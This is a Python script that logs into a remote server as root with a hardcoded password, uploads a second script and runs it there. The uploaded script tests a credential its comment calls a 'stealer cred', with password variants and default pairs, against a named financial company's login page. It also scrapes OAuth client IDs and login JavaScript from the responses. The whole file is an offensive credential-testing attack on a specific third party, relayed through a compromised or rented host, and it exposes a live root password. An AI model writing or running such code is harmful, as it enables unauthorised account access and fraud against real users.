import paramiko, sys, time

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = """
import requests, urllib3, json, sys, time, re
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.111 Safari/537.36"

BASE = "https://core.findep.mx"

def try_login(user, password):
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": UA, "Referer": BASE + "/core/index.jsp"})
    r = s.get(BASE + "/core/index.jsp", timeout=15)
    act_m = re.search(r'action="([^"]+)"', r.text)
    action = act_m.group(1) if act_m else "/core/valida.do"
    
    payload = {
        "cve_idToken": "",
        "msjPass": "",
        "cveUsr": "",
        "cve_usr": user,
        "cve_psd": password,
        "ok_btn": "Aceptar",
    }
    
    r2 = s.post(BASE + action, data=payload, timeout=15, allow_redirects=True)
    
    # Extract msjPass value from response
    m = re.search(r'name="msjPass"\\s+value="([^"]*)"', r2.text)
    msjpass = m.group(1) if m else "(not found)"
    
    m2 = re.search(r'name="cveUsr"\\s+value="([^"]*)"', r2.text)
    cveusr = m2.group(1) if m2 else "(not found)"
    
    is_login = "cve_usr" in r2.text and "cve_psd" in r2.text
    
    return {
        "status": r2.status_code,
        "size": len(r2.text),
        "msjPass": msjpass,
        "cveUsr": cveusr,
        "is_login_page": is_login,
        "url": str(r2.url),
        "cookies": dict(s.cookies),
    }

# Test with stealer cred
sys.stdout.write("=== CORE LOGIN TESTS ===\\n\\n")

tests = [
    ("afigueroac", "afigueroac"),
    ("afigueroac", "AFigueroac"),
    ("afigueroac", "Afigueroac1"),
    ("afigueroac", "afigueroac1"),
    ("AFIGUEROAC", "afigueroac"),
    ("admin", "admin"),
    ("test", "test"),
    ("invaliduser12345", "invaliduser12345"),
]

for user, pw in tests:
    res = try_login(user, pw)
    sys.stdout.write(user + ":" + pw + " → ")
    sys.stdout.write("[" + str(res["status"]) + "] " + str(res["size"]) + "b")
    sys.stdout.write(" msjPass='" + res["msjPass"][:100] + "'")
    sys.stdout.write(" cveUsr='" + res["cveUsr"][:50] + "'")
    if not res["is_login_page"]:
        sys.stdout.write(" *** NOT LOGIN PAGE ***")
    sys.stdout.write("\\n")
    time.sleep(1)
    sys.stdout.flush()

# Read the saved response for full analysis
sys.stdout.write("\\n=== FULL RESPONSE ANALYSIS ===\\n")
res = try_login("afigueroac", "afigueroac")
sys.stdout.write("msjPass full: '" + res["msjPass"] + "'\\n")
sys.stdout.write("cveUsr full: '" + res["cveUsr"] + "'\\n")

# Get the full page to analyze
s2 = requests.Session()
s2.verify = False
s2.headers.update({"User-Agent": UA})
r = s2.get(BASE + "/core/index.jsp", timeout=15)
act_m = re.search(r'action="([^"]+)"', r.text)
action = act_m.group(1) if act_m else "/core/valida.do"
r2 = s2.post(BASE + action, data={
    "cve_idToken":"","msjPass":"","cveUsr":"",
    "cve_usr":"afigueroac","cve_psd":"afigueroac","ok_btn":"Aceptar"
}, timeout=15, allow_redirects=True)

# Extract Google OAuth details
gid = re.search(r'client_id["\\':\\s]+([\\d\\-]+\\.apps\\.googleusercontent\\.com)', r2.text)
if gid:
    sys.stdout.write("\\nGoogle Client ID: " + gid.group(1) + "\\n")

# Extract any JS that handles login response
scripts = re.findall(r'<script[^>]*>(.*?)</script>', r2.text, re.S)
for i, sc in enumerate(scripts):
    if "msjPass" in sc or "cveUsr" in sc or "valida" in sc or "error" in sc.lower() or "session" in sc.lower():
        sys.stdout.write("\\nScript " + str(i) + " (relevant):\\n" + sc.strip()[:500] + "\\n")

# Diff the two pages
sys.stdout.write("\\n=== PAGE DIFF ===\\n")
lines1 = r.text.splitlines()
lines2 = r2.text.splitlines()
for i, (l1, l2) in enumerate(zip(lines1, lines2)):
    if l1 != l2:
        sys.stdout.write("Line " + str(i+1) + " CHANGED:\\n")
        sys.stdout.write("  - " + l1.strip()[:150] + "\\n")
        sys.stdout.write("  + " + l2.strip()[:150] + "\\n")
if len(lines2) > len(lines1):
    sys.stdout.write("\\nExtra lines in response:\\n")
    for l in lines2[len(lines1):]:
        sys.stdout.write("  + " + l.strip()[:150] + "\\n")

sys.stdout.write("\\n=== DONE ===\\n")
"""

sftp = ssh.open_sftp()
with sftp.open('/root/core_error.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

transport = ssh.get_transport()
channel = transport.open_session()
channel.exec_command('python3 -u /root/core_error.py 2>&1')
channel.settimeout(5)

start = time.time()
while time.time() - start < 90:
    try:
        if channel.recv_ready():
            chunk = channel.recv(8192).decode(errors='replace')
            sys.stdout.write(chunk)
            sys.stdout.flush()
        elif channel.exit_status_ready():
            while channel.recv_ready():
                chunk = channel.recv(8192).decode(errors='replace')
                sys.stdout.write(chunk)
                sys.stdout.flush()
            break
        else:
            time.sleep(0.3)
    except Exception:
        time.sleep(0.3)

print('\nFin.', flush=True)
ssh.close()
